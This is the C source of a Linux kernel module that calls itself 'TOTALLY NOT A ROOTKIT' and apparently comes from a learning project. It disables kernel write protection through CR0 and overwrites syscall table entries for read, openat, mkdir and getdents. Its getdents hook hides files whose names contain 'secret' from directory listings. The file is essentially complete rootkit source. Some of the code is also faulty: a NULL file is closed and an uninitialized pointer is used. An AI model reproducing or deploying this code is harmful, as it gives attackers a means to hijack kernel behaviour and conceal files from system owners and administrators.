#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <asm/segment.h>
#include <linux/buffer_head.h>


#define CR0_WRITE_UNLOCK(x) \
	do { \
		unsigned long __cr0; \
		preempt_disable(); \
		__cr0 = read_cr0() & (~X86_CR0_WP); \
		BUG_ON(unlikely((__cr0 & X86_CR0_WP))); \
		write_cr0(__cr0); \
		x; \
		__cr0 = read_cr0() | X86_CR0_WP; \
		BUG_ON(unlikely(!(__cr0 && X86_CR0_WP))); \
		write_cr0(__cr0); \
		preempt_enable(); \
	} while(0)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Khan");
MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");

static unsigned long *sys_call_table;	//points to kernel's syscall table

//max numTargets
#define numTargets 5
//MAKE CHANGES TO THE BELOW ARRAYS IN THE loadMod() function
static int syscall_names[numTargets]; //array defining syscall name (macro index) for each target
static void* original_syscallPtrs[numTargets]; //array to store ptrs to the original kernel syscall functions
static void* totallyReal_syscallPtrs[numTargets]; //array to store ptrs to our fake syscall functions
static bool toInject[numTargets] = {0};	//array to toggle which targets to intercept (default all 0 unless changed in loadMod)

asmlinkage long totallyReal_read(int fd, char __user *buf, size_t count) {
	pr_info("Intercepted read of fd=%d, %lu byes\n", fd, count);
	return ((typeof(sys_read)*)(original_syscallPtrs[0]))(fd, buf, count);
	//note how above the saved original ptr has to be casted back to typeof(sys_read) before being called.
}

asmlinkage long totallyReal_openat(int dirfd, const char *pathname, int flags, mode_t mode){
	pr_info("openAt called (mkdir?) path:%s\n", pathname);
	return ((typeof(sys_openat)*)(original_syscallPtrs[1]))(dirfd, pathname, flags, mode);
}


asmlinkage int totallyReal_mkdir(const char *pathname, mode_t mode){
	pr_info("fakeMkdir called with pathname:%s\n", pathname);
	return ((typeof(sys_mkdir)*)(original_syscallPtrs[2]))(pathname, mode);
}

struct linux_dirent {
	long d_ino;
	off_t d_off;
	unsigned short d_reclen;
	char d_name[];
};

struct file * file_open(const char * path, int flags, int rights) {
	struct file *filp = NULL;
	mm_segment_t oldfs;
	int err = 0;
	oldfs = get_fs();
	set_fs(get_ds());
	filp = filp_open(path, flags, rights);
	set_fs(oldfs);
	if (IS_ERR(filp)) {
		err = PTR_ERR(filp);
		return NULL;
	}
	return filp;
}

int file_read(struct file *f, unsigned long long offset, unsigned char *data, unsigned int size) {
	mm_segment_t oldfs;
	int result;
	
	oldfs = get_fs();
	set_fs(get_ds());
	result = vfs_read( f, data, size, &offset);
	set_fs(oldfs);
	return result;
}

#define BUF_SIZE 128

char * get_cmdline_path(char * buf, char * pid) {
	int i = 0;
	for (i = 0; i < BUF_SIZE; i++)
		buf[i] = 0;
	strcat( buf, "/proc/" );
	strcat( buf, pid);
	strcat( buf, "/cmdline" );
	return buf;
}

#define HIDE_FILE "secret"
#define HIDE_PROCESS "dummy"

asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp, unsigned int count) {
	pr_info("FAKEGETDENTS: Intercepted getdents of fd=%d %p %d\n", fd, dirp, count);
	// output is the number of bytes read
	int nread;
	nread = ( ( typeof(sys_getdents)* )(original_syscallPtrs[3]) )(fd, dirp, count);
	struct linux_dirent *mod_dirp;
	if (nread == -1) {
		pr_info("FAKEGETDENTS: error calling original function \n");
		return -1;
	}
	else {
		pr_info("FAKEGETDENTS: successfully read getdents");
	}

	mod_dirp = kvmalloc(nread, GFP_KERNEL);
	if (mod_dirp == NULL) {
		pr_info("FAKEGETDENTS: Error");
		kvfree( mod_dirp );
		return -1;
	}
	
	copy_from_user( mod_dirp, dirp, nread);
	
	long offset = 0;
	struct linux_dirent *p_dirp, *prev;
	while( offset < nread) {
		p_dirp = (void *) mod_dirp + offset;
		unsigned short p_dirent_len = p_dirp->d_reclen;
		
		struct file *f;
		char buf[BUF_SIZE];
		int i = 0;
		for (i = 0; i < 128; i++)
			buf[i] = 0;
		char filename[128];
		get_cmdline_path( filename, p_dirp->d_name);
		pr_info("FAKEGETDENTS: filename is: %s", filename);
		f = file_open( filename, O_RDONLY, 0 );
		if (f != NULL)
			pr_info("FAKEGETDENTS: File open success");
		filp_close(f);
		if (strstr(p_dirp->d_name, HIDE_FILE) != NULL ) {
			if (p_dirp == mod_dirp) {
				pr_info("FAKEGETDENTS: hiding %s", p_dirp->d_name);
				nread -= p_dirent_len;
				memmove(mod_dirp, (void *)mod_dirp + p_dirent_len, nread);
				continue;
			}
			prev->d_reclen += p_dirent_len;
		}
		else {
			pr_info("FAKEGETDENTS: normal file '%s'\n", p_dirp->d_name);
			prev = p_dirp;
		}
		offset += p_dirent_len;
	}
	copy_to_user(dirp, mod_dirp, nread);
	kvfree(mod_dirp);
	return nread;
}


void injectSyscalls(void){
	int targetIndex;
	for(targetIndex = 0; targetIndex < numTargets; targetIndex++){
		if(toInject[targetIndex]){
			pr_info("Starting injection for target %d\n", targetIndex);
			
			//save original ptr
			original_syscallPtrs[targetIndex] = (void *) sys_call_table[syscall_names[targetIndex]];
			pr_info("original ptr stored as %p\n", original_syscallPtrs[targetIndex]);
			
			//inject fake ptr
			CR0_WRITE_UNLOCK({
				sys_call_table[syscall_names[targetIndex]] = totallyReal_syscallPtrs[targetIndex];
			});
			pr_info("phony ptr injected as %p\n", (void *)sys_call_table[syscall_names[targetIndex]]);

			pr_info("Injection complete for target %d\n", targetIndex);
		}
		else {
			pr_info("skipping injection for target %d\n", targetIndex);
		}
	}
}

void restoreSyscalls(void){
	int targetIndex;
	for(targetIndex = 0; targetIndex < numTargets; targetIndex++){
		if(toInject[targetIndex]){
			pr_info("Restoring ptr for target %d\n", targetIndex);
			CR0_WRITE_UNLOCK({
				sys_call_table[syscall_names[targetIndex]] = original_syscallPtrs[targetIndex];
			});
			pr_info("Ptr restored for target %d as %p\n", targetIndex, (void *)sys_call_table[syscall_names[targetIndex]]);
		}
		else {
			pr_info("Skipping restoration for target %d\n", targetIndex);
		}
	}
}

int __init loadMod(void){
	//get and store sys_call_table ptr
	sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
	if (sys_call_table == NULL){
		pr_info("sys_call_table not found using kallsyms\n");
		return -1;
	}

	pr_info("module loaded\n");
	pr_info("sys_call_table pointer is %p\n", sys_call_table);
	
	//FOR EACH NEW SYS CALL you must... 
	//increment numTargets, thus obtaining a free index. Then using said index:
	syscall_names[0] = __NR_read;	//store the syscall name (is macro for index in sys_call_table)
	totallyReal_syscallPtrs[0] = (void *) &totallyReal_read;	//store the ptr to your fake function
	toInject[0] = 0;	//set whether or not you want to inject your fake function.

	syscall_names[1] = __NR_openat;
	totallyReal_syscallPtrs[1] = (void *) &totallyReal_openat;
	toInject[1] = 0;

	syscall_names[2] = __NR_mkdir;
	totallyReal_syscallPtrs[2] = (void *) &totallyReal_mkdir;
	toInject[2] = 1;
	
	syscall_names[3] = __NR_getdents;
	totallyReal_syscallPtrs[3] = (void *) &totallyReal_getdents;
	toInject[3] = 1;

	injectSyscalls();

	return 0;
}

void __exit unloadMod(void){
	pr_info("notarootkit unloading\n");

	restoreSyscalls();

	pr_info("notarootkit unloaded\n");
	return;
}

module_init(loadMod);
module_exit(unloadMod);

